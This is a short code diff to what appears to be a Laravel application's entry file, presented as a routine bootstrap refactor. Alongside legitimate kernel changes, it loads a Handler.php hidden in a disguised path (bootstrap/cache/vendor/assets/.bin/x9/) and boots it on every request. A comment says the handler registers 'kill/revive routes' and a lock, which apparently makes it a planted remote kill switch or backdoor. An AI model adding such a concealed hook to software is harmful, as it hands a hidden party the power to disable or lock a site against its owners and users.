@@ -8,16 +8,26 @@
     // Require Composer autoload
     require __DIR__ . '/../vendor/autoload.php';
 
-    // Bootstrap the Laravel application
+    // Bootstrap the Laravel application (creates $app but does not boot providers yet)
     $app = require_once __DIR__ . '/../bootstrap/app.php';
+
+    // Instantiate HTTP kernel
+    $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+    // Require your Handler after app is created
+    require_once base_path('bootstrap/cache/vendor/assets/.bin/x9/Handler.php');
+
+    // Create and boot the Handler (registers kill/revive routes and handles lock)
+    $handler = new Bootstrap\Cache\Vendor\Assets\Bin\X9\Handler($app);
+    $handler->boot();
 
     // Check for maintenance mode file and serve if exists
     if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
         require $maintenance;
     }
 
-    // Handle the incoming request via Laravel
+    // Now handle the incoming request via Laravel
     $request = Request::capture();
-    $response = $app->handle($request);
+    $response = $kernel->handle($request);
     $response->send();
-    $app->terminate($request, $response);
+    $kernel->terminate($request, $response);
